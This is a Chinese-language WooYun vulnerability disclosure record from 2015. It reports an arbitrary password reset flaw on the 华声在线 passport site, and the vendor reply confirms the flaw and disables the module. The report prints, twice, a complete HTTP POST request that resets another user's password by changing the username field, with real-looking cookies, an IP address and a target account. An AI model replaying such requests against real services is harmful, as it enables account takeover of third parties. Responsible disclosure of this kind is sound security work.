{"id": 83287, "wybug_id": "wooyun-2015-0148354", "wybug_title": "华声在线任意重置用户密码", "wybug_corp": "华声在线", "wybug_author": "路人甲", "wybug_date": "2015-10-21 15:53", "wybug_open_date": "2015-12-09 23:16", "wybug_type": "设计缺陷/逻辑错误", "wybug_level": "高", "wybug_rank_0": "20", "wybug_status": "厂商已经确认", "wybug_from": "http://www.wooyun.org", "wybug_tags": ["逻辑错误", "认证设计不合理"], "wybug_detail": "漏洞详情 披露状态：   \t\t\t\t\t\t\t\t\t2015-10-21：\t细节已通知厂商并且等待厂商处理中\t\t\t\t\t\t\t\t\t2015-10-25：\t厂商已经确认，细节仅向厂商公开\t\t\t\t\t\t\t\t\t2015-11-04：\t细节向核心白帽子及相关领域专家公开\t\t\t\t\t\t\t\t\t2015-11-14：\t细节向普通白帽子公开\t\t\t\t\t\t\t\t\t2015-11-24：\t细节向实习白帽子公开\t\t\t\t\t\t\t\t\t2015-12-09：\t细节向公众公开  简要描述： 华声在线任意重置用户密码在忘记密码的url中，服务器只验证uid和id的合法性，然后用户名和密码可以随意修改为其他用户任意用户密码重置，秒改，非爆破 详细说明：  首先，用户正常申请忘记密码，填写自己的邮箱等到修改密码的url\n\n得到合法的uid和iduid=4829517&id=2w79k0在burpsuit中发送如下数据包，即可修改用户lings16316cn的密码，用户名可以随意修改\nPOST /do.php?ac=lostpasswd&op=reset HTTP/1.1Host: passport.voc.com.cnProxy-Connection: keep-aliveContent-Length: 143Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://passport.voc.com.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://passport.voc.com.cn/do.php?ac=lostpasswd&op=reset&uid=4829517&id=ip31IqAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: userCity=-+%BD%AD%CB%D5%CA%A1%C4%CF%BE%A9%CA%D0+%B5%E7%D0%C5ADSL; ip_add=58.213.104.197; Hm_lvt_54d168345d20f9f8dd4cdd0eb49afd11=1445389256,1445389713; Hm_lpvt_54d168345d20f9f8dd4cdd0eb49afd11=1445389713; vocsso_seccode=7bdfFJIRWkXTTfJx1Gr3KHRSnLQkZeG7pYE8sxMqlPDa; VOC_SSO_UID=4829544newpasswd1=test1111&newpasswd2=test1111&ucemail=hehe%40126.com&username=lings16316cn&resetsubmit=%D6%D8%C9%E8%C3%DC%C2%EB&uid=4829517&id=2w79k0\n修改之后，登录成功\n\n   漏洞证明：  首先，用户正常申请忘记密码，填写自己的邮箱等到修改密码的url\n\n得到合法的uid和iduid=4829517&id=2w79k0在burpsuit中发送如下数据包，即可修改用户lings16316cn的密码，用户名可以随意修改\nPOST /do.php?ac=lostpasswd&op=reset HTTP/1.1Host: passport.voc.com.cnProxy-Connection: keep-aliveContent-Length: 143Cache-Control: max-age=0Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8Origin: http://passport.voc.com.cnUpgrade-Insecure-Requests: 1User-Agent: Mozilla/5.0 (Windows NT 6.1; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/46.0.2490.71 Safari/537.36Content-Type: application/x-www-form-urlencodedReferer: http://passport.voc.com.cn/do.php?ac=lostpasswd&op=reset&uid=4829517&id=ip31IqAccept-Encoding: gzip, deflateAccept-Language: zh-CN,zh;q=0.8Cookie: userCity=-+%BD%AD%CB%D5%CA%A1%C4%CF%BE%A9%CA%D0+%B5%E7%D0%C5ADSL; ip_add=58.213.104.197; Hm_lvt_54d168345d20f9f8dd4cdd0eb49afd11=1445389256,1445389713; Hm_lpvt_54d168345d20f9f8dd4cdd0eb49afd11=1445389713; vocsso_seccode=7bdfFJIRWkXTTfJx1Gr3KHRSnLQkZeG7pYE8sxMqlPDa; VOC_SSO_UID=4829544newpasswd1=test1111&newpasswd2=test1111&ucemail=hehe%40126.com&username=lings16316cn&resetsubmit=%D6%D8%C9%E8%C3%DC%C2%EB&uid=4829517&id=2w79k0\n\n\n修改之后，登录成功\n\n   修复方案：  需要验证uid和用户名还有id   版权声明：转载请注明来源 路人甲@乌云\n ", "wybug_reply": "漏洞回应  厂商回应： 危害等级：中 漏洞Rank：8  确认时间：2015-10-25 23:14 厂商回复： 已经暂时停用该模块，转交程序员修正中。感谢支持！ 最新状态： 暂无  ", "replys": "漏洞评价：\n评价\n  \n\n\n", "wybug_level_fromcorp": "中", "wybug_rank_fromcorp": 8, "Ranks": null}